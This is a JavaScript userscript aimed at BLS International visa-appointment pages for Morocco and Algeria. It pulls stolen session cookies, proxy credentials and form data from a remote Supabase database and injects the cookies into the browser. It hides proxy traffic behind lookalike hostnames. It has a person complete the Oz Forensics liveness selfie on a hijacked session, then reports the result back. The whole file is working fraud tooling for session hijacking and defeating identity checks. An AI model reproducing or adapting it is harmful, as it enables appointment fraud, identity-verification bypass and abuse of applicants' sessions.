var body = document.body.innerText;
String.prototype.includesOneOf = function(arr) { if (!Array.isArray(arr)) { return this.includes(arr) }; return arr.some(str => this.includes(str)) }
const randomString = () => Math.random().toString(36).slice(2, 8);

if (body == 'Backend service does not exist') { refresh(60) }
else if (body.includesOneOf(["Gateway","Application Temporarily Unavailable"])) refresh(3,true);
else if (body.includesOneOf(["500 Internal Server Error","503 Service Temporarily Unavailable"])) refresh(30);
else if (body == '403 Forbidden' || body.includes("Too Many Requests")) refresh(60,true);
/******************************************************************************************************************************************************/
const ssid = new URLSearchParams(location.search).get('ssid') || null;
window.transaction_id = new URLSearchParams(location.search).get('transaction_id') || null;
window.user_id = new URLSearchParams(location.search).get('user_id') || null;
if (!sessionStorage.linkdata) sessionStorage.linkdata = new URLSearchParams(location.search).get('data') || null;
if (ssid) sessionStorage.ssid = ssid;

if (location.href.toLowerCase().includesOneOf(["/home/index","site.js"]) && ssid) {
    goSupa ();
    function goSupa () {
        if (typeof(supabase) != "object") { require2("https://cdn.jsdelivr.net/npm/@supabase/supabase-js",function(){ goSupa () }); return }
        var SUPABASE_URL = "https://bfnyetctnuxrcuxjqkvt.supabase.co";
        var SUPABASE_ANON_KEY = "GDY7ZMDK637TDKAUU6O5SHMMHSHQTP4MHEKJWK5EP7P5MQOKEBWESJLL";
        const { createClient } = supabase;
        const supa = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
        supa.from('links').select('*').eq('ssid', ssid).then(({ data, error }) => {
            if (error) { console.error(error); }
            else if (data[0]) res (data);
        });
    }
    function res(data) {
        if (!document.getElementById("activateProxy")) return setTimeout(() => res(data), 500);

        const proxy = data[0]?.proxy || prompt("Please fill proxy here");
        //if (!proxy) return console.error("No proxy provided.");

        const [host, port, username, password] = proxy.split(":");
        if (!host || !port || !username || !password) return alert("Invalid proxy format!");
        
        var HOST = host == "p.webshare.io" ? randomString()+".webshare.outlook-now.stream" :
        host == "ma-pr.oxylabs.io" ? randomString()+".ma-pr.oxylabs.outlook-now.stream" :
        host == "dz-pr.oxylabs.io" ? randomString()+".dz-pr.oxylabs.outlook-now.stream" :
        host;

        localStorage.proxyData = !proxy ? '' : JSON.stringify({ action: "setProxy", scheme: "https", host: HOST, port, username, password });
        document.getElementById("activateProxy").click();
        
        if (data[0].cookies == "live") {
            document.body.innerHTML = `
                <div id= "message" style="text-align: center; margin: 20px;">
                    <h1 style="color: #333;">âš ï¸ Please Wait .... âš ï¸</h1>
                </div>
            `; addStyle();
            window.el = JSON.parse(data[0].html);
            const form = document.createElement('form');
            form.action = el.action; form.method = 'post';
            document.body.appendChild(form);
            document.getElementById('activateProxy')?.remove();
            form.innerHTML = el.form;
            livenessrequest();
            setTimeout(reloadLiveness,2000);
        }
        else if (typeof GM_cookie !== "function") return alert("Fatal error! Please switch to the correct version.");
        else {
            sessionStorage.account = data[0].account;
    
            const cookies = JSON.parse(data[0].cookies || "[]");
            setTimeout(function () {
                cookies.forEach((cookie, idx) => GM_cookie.set(cookie, (_, error) => {
                    if (error) console.error("Cookie error:", error);
                    if (idx === cookies.length - 1) {
                        document.body.innerHTML = '<br><br>'; addStyle();
                        window.el = JSON.parse(data[0].html);
                        const form = document.createElement('form');
                        form.action = el.action; form.method = 'post';
                        document.body.appendChild(form);
                        document.getElementById('activateProxy')?.remove();
                        form.innerHTML = el.form;
                        setTimeout(() => {
                            form.submit();
                            //typeof(jQuery) == 'undefined' ? form.submit() : submitReq($("form").prop("action"))
                        }, 3000);
                        return;
                    }
                }));
            },3000)
        }
    }

}
else if (location.href.toLowerCase().includes("/appointment/livenessrequest") && $("#formLiveness").length) livenessrequest($("body").text());
else if (location.href.toLowerCase().includes("appointment/liveness")) {
    setTimeout(function () {
        $(".btn-success").click()
    },3000)
}
/***********************************************************************************************************************************************************************/
function livenessrequest(html_text) {
    if (html_text) {
        const transactionIdMatch = html_text.match(/'transaction_id':\s*'([^']+)'/);
        const appid = transactionIdMatch ? transactionIdMatch[1] : null;
    }

    document.addEventListener("DOMContentLoaded", function () {
        const formLiveness = document.getElementById("formLiveness");
        if (formLiveness) {
            formLiveness.addEventListener("submit", function (event) {
                event.preventDefault();
                goSupa3(html_text);
            });
        }
    });

    const newPath = location.href.includes("algeria")
        ? "/DZA/appointment/livenessrequest"
        : "/MAR/appointment/livenessrequest";
    history.pushState({}, "", newPath);
}
/***********************************************************************************************************************************************************************/
function goSupa3(html_text) {
    if (typeof supabase !== "object") {
        require2(
            "https://cdn.jsdelivr.net/npm/@supabase/supabase-js",
            function () {
                goSupa3();
            }
        );
        return;
    }

    const SUPABASE_URL =
        "https://lswbndqztrjlqhmhgnjw.supabase.co";
    const SUPABASE_ANON_KEY =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imxzd2JuZHF6dHJqbHFobWhnbmp3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3MDczNzg5OTEsImV4cCI6MjAyMjk1NDk5MX0.ZC-vQYU26XaY6-BvyjkMkQXO1iigfjftqRFDGIneHWg";

    const { createClient } = supabase;
    const supa = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

    const formElement = document.querySelector("form");
    const data = {
        ssid: sessionStorage.ssid,
        cookies: "ready",
        proxy: "",
        url: formElement ? formElement.action : "",
        account: window.transaction_id,
        html: Array.isArray(html_text) ? html_text[0] : formElement ? formElement.innerHTML : "",
    };

    supa.from("links").insert(data).then(function () {
        addStyle();
        document.body.innerHTML = `
            <h1><span style='color:green;'>Selfie succeeded! Please leave this page, thanks!</span></h1>
            <br/>
            <h1>Ù†Ø¬Ø­Øª Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„Ø°Ø§ØªÙŠØ©ØŒ ÙŠØ±Ø¬Ù‰ Ù…ØºØ§Ø¯Ø±Ø© Ù‡Ø°Ù‡ Ø§Ù„ØµÙØ­Ø©ØŒ Ø´ÙƒØ±Ù‹Ø§</h1>
            <br/>
            <h1><span style='color:green;'>Selfie rÃ©ussi, veuillez quitter cette page, merci !</span></h1>
        `;
        if (typeof proxyOff === "function") {
            proxyOff();
        }
    }).catch(function (error) {
        setTimeout(goSupa3, 1000);
        console.error("Supabase request error: ", error);
    });
}

window.goSupa3 = goSupa3;

function reloadLiveness() {
    if (typeof OzLiveness === "undefined") {
        return require2(
            "https://web-sdk.spain.prod.ozforensics.com/blsinternational/plugin_liveness.php",
            reloadLiveness
        );
    }

    if (!window.transaction_id && !window.user_id) {
        const bodyText = document.body.textContent || document.body.innerText;
        const userIdMatch = bodyText.match(/'user_id':\s*'([^']+)'/);
        const transactionIdMatch = bodyText.match(/'transaction_id':\s*'([^']+)'/);

        window.user_id = userIdMatch ? userIdMatch[1] : null;
        window.transaction_id = transactionIdMatch ? transactionIdMatch[1] : null;
        window.appid = window.transaction_id;
    }


    // Check if the button already exists
    if (!document.getElementById("liveness")) {
        // Add loading message to the top of the page
        document.getElementById('message').innerHTML = `
            <div style="text-align: center; margin: 20px;">
                <h1 style="color: #333;">Please Wait until the selfie Loads .... âš ï¸ Please allow the camera to record âš ï¸</h1>
                <h1 style="color: #666;">ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø³Ù…Ø§Ø­ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¨Ø§Ù„ØªØ³Ø¬ÙŠÙ„âš ï¸ ... ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ø­ØªÙ‰ ÙŠØªÙ… ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„Ø´Ø®ØµÙŠØ©âš ï¸</h1>
                <h1 style="color: #555;">Veuillez attendre que le selfie se charge .... âš ï¸ Veuillez permettre Ã  la camÃ©ra d'enregistrer âš ï¸</h1>
            </div>
        `
        // Create the styled button
        const button = document.createElement("button");
        button.id = "liveness";
        button.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 999999;
            padding: 12px 24px;
            font-size: 16px;
            font-weight: bold;
            color: #fff;
            background-color: #007bff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            transition: background-color 0.3s ease;
        `;
        button.textContent = "Reload Liveness";

        // Add hover effect
        button.addEventListener("mouseenter", () => {
            button.style.backgroundColor = "#0056b3";
        });
        button.addEventListener("mouseleave", () => {
            button.style.backgroundColor = "#007bff";
        });

        // Add click event listener
        button.onclick = reloadLiveness;

        // Append the button to the body
        document.body.appendChild(button);
    }

    // Initialize OzLiveness
    OzLiveness.open({
        lang: "en",
        meta: {
            user_id: window.user_id,
            transaction_id: window.transaction_id,
        },
        overlay_options: false,
        action: ["video_selfie_blank"],
        result_mode: "safe",
        on_complete: function (result) {
            console.log(result);
            const LivenessIdInput = document.getElementById("LivenessId");
            if (LivenessIdInput) {
                LivenessIdInput.value = result.event_session_id;
            }
            goSupa3([result.event_session_id]);
        },
    });
}
/***********************************************************************************************************************************************************************/
function submitReq(url) {
    window.xhr = new XMLHttpRequest();
    $.ajax({
        type: "POST", data: $("form").serialize(), url, dataType: "json",
        xhr: () => xhr,
        statusCode: {
            200: (rsp) => {
                history.pushState({}, '',  xhr.responseURL);
                console.log(xhr.responseURL)
                if (xhr.responseURL.includes("livenessrequest")) {
                    $(xhr.responseText).each((_, el) => {
                        if (el.tagName?.toLowerCase() === "form") {
                            $("form").html($(el).html());
                            $("form").prop("action", $(el).prop("action"));
                            livenessrequest(xhr.responseText);
                            window.user_id = xhr.responseText.match(/'user_id':\s*'([^']+)'/)[1];
                            window.transaction_id = xhr.responseText.match(/'transaction_id':\s*'([^']+)'/)[1];
                            window.appid = window.transaction_id;
                            reloadLiveness ()

                            document.title = "waiting selfie | MAR";
                        }
                    });
                }
                else $(xhr.responseText).each((_, el) => {
                    if (el.tagName?.toLowerCase() === "main") {
                        let e = $("main").length ? $("main") : $("body")
                        e.html($(el).html());
                        if (typeof(HideLoader) == 'function') HideLoader();
                        $(".modal-backdrop").remove();
                    }
                });
            },
            429: (rsp) => handleError(url, "error 429"),
            403: (rsp) => handleError(url, "error 403"),
            502: () => retrySubmit(url, 1000, "error 502"),
            504: () => retrySubmit(url, 1000, "error 504"),
            0: () => retrySubmit(url, 1000, "error 0")
        },
        error: (jqXHR) => handleAjaxError(jqXHR, url)
    });
    function handleError(url, message) {
        $("h5").css("color", "red").text(message);
        setTimeout(submitReq, 60000, url);
    }

    function retrySubmit(url, delay, message) {
        $("h5").css("color", "red").text(message);
        setTimeout(submitReq, delay, url);
    }

    function handleAjaxError(jqXHR, url) {
        if (![200, 302, 403, 429, 502, 504, 500].includes(jqXHR.status)) retrySubmit(url, 1000);
    }


}
function addStyle () {
    document.head.insertAdjacentHTML("beforeend", `<style>
            body {
                    font-family: Arial, sans-serif;
                    text-align: center;
                    background-color: #f5f5f5;
                    color: #333;
                    margin: 0;
                    padding: 0;
                }
        </style>`);
}
function refresh (seconds,rel) {
    let e = setTimeout(function () {!rel ? location.href = '' : location.reload()}, seconds*1000);
    let time = seconds >= 3600 ? Math.floor(seconds / 3600) + "h " + Math.floor((seconds % 3600) / 60) + "min " + (seconds % 60) + "sec" : seconds >= 60 ? Math.floor(seconds / 60) + "min " + (seconds % 60) + "sec" : seconds + " seconds"
    console.log(`%crefreshing in ${time}...`,"color: black; font-size:12px;");
    return e
}
function require2(url, callback, cache) {
    var e = document.createElement("script");
    var r = cache ? Math.floor(Math.random()*10000000000) : '';
    e.src = url+"?_="+r;
    e.type="text/javascript";
    e.addEventListener('load', callback);
    e.addEventListener('error', function() { setTimeout(require2,3000,url,callback) })
    document.getElementsByTagName("html")[0].appendChild(e);
}
Scripts